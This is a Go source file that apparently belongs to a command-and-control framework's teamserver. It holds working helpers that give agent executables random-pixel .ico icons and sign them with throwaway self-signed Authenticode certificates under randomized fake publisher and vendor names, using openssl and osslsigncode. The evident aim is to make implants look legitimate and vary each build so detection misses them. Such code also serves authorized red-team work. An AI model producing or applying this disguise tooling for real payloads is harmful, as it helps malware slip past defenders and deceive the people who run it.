package main

import (
	"bytes"
	"encoding/binary"
	"errors"
	"fmt"
	"image"
	"image/color"
	"image/png"
	"math/rand/v2"
	"os/exec"
	"path/filepath"
)

// validateICOFile checks minimal .ico header (Windows icon resource type 1).
func validateICOFile(data []byte) error {
	if len(data) < 6 {
		return errors.New("icon: file too small")
	}
	if data[0] != 0 || data[1] != 0 {
		return errors.New("icon: invalid reserved field")
	}
	if data[2] != 1 || data[3] != 0 {
		return errors.New("icon: expected a Windows .ico file")
	}
	n := int(data[4]) | int(data[5])<<8
	if n < 1 {
		return errors.New("icon: no images in file")
	}
	return nil
}

// generateRandomICO builds a single 32×32 icon (PNG payload inside .ico, Windows-compatible).
func generateRandomICO() ([]byte, error) {
	const w, h = 32, 32
	img := image.NewNRGBA(image.Rect(0, 0, w, h))
	for y := 0; y < h; y++ {
		for x := 0; x < w; x++ {
			img.SetNRGBA(x, y, color.NRGBA{
				R: uint8(rand.Uint32()),
				G: uint8(rand.Uint32()),
				B: uint8(rand.Uint32()),
				A: 255,
			})
		}
	}
	var pngBuf bytes.Buffer
	if err := png.Encode(&pngBuf, img); err != nil {
		return nil, err
	}
	pngData := pngBuf.Bytes()

	var out bytes.Buffer
	_, _ = out.Write([]byte{0, 0, 1, 0, 1, 0})
	_ = out.WriteByte(w)
	_ = out.WriteByte(h)
	_ = out.WriteByte(0)
	_ = out.WriteByte(0)
	_ = binary.Write(&out, binary.LittleEndian, uint16(1))
	_ = binary.Write(&out, binary.LittleEndian, uint16(32))
	_ = binary.Write(&out, binary.LittleEndian, uint32(len(pngData)))
	_ = binary.Write(&out, binary.LittleEndian, uint32(22))
	_, _ = out.Write(pngData)
	return out.Bytes(), nil
}

const exePseudoSignPfxPass = "ax-pseudo-sign"

func randomFakeSignDN() (cn, org string) {
	cn = fmt.Sprintf("App-%08X%08X", rand.Uint32(), rand.Uint32())
	org = fmt.Sprintf("Vendor-%08X", rand.Uint32())
	return cn, org
}

func runCmdCombined(dir, name string, args ...string) (string, error) {
	cmd := exec.Command(name, args...)
	cmd.Dir = dir
	out, err := cmd.CombinedOutput()
	s := string(out)
	if err != nil {
		return s, fmt.Errorf("%s %v failed: %w\n%s", name, args, err, s)
	}
	return s, nil
}

// applySelfSignedAuthenticode signs inExe with an ephemeral self-signed cert (random CN/O) and writes outExe.
// Requires openssl and osslsigncode on the teamserver PATH (same as Beacon agent).
func applySelfSignedAuthenticode(inExe, outExe, workDir string) error {
	if _, err := exec.LookPath("openssl"); err != nil {
		return errors.New("pseudo-sign requires openssl in PATH")
	}
	if _, err := exec.LookPath("osslsigncode"); err != nil {
		return errors.New("pseudo-sign requires osslsigncode in PATH")
	}
	keyPEM := filepath.Join(workDir, "ax_pseudo_key.pem")
	certPEM := filepath.Join(workDir, "ax_pseudo_cert.pem")
	pfxPath := filepath.Join(workDir, "ax_pseudo.pfx")
	cn, org := randomFakeSignDN()
	subj := "/CN=" + cn + "/O=" + org
	if _, err := runCmdCombined(workDir, "openssl", "genpkey", "-algorithm", "RSA", "-pkeyopt", "rsa_keygen_bits:2048", "-out", keyPEM); err != nil {
		return err
	}
	if _, err := runCmdCombined(workDir, "openssl", "req", "-new", "-x509", "-key", keyPEM, "-sha256", "-days", "365", "-out", certPEM, "-subj", subj); err != nil {
		return err
	}
	if _, err := runCmdCombined(workDir, "openssl", "pkcs12", "-export", "-out", pfxPath, "-inkey", keyPEM, "-in", certPEM, "-passout", "pass:"+exePseudoSignPfxPass); err != nil {
		return err
	}
	absIn, err := filepath.Abs(inExe)
	if err != nil {
		return err
	}
	absOut, err := filepath.Abs(outExe)
	if err != nil {
		return err
	}
	_, err = runCmdCombined(workDir, "osslsigncode", "sign",
		"-h", "sha256",
		"-pkcs12", pfxPath,
		"-pass", exePseudoSignPfxPass,
		"-in", absIn,
		"-out", absOut,
	)
	return err
}
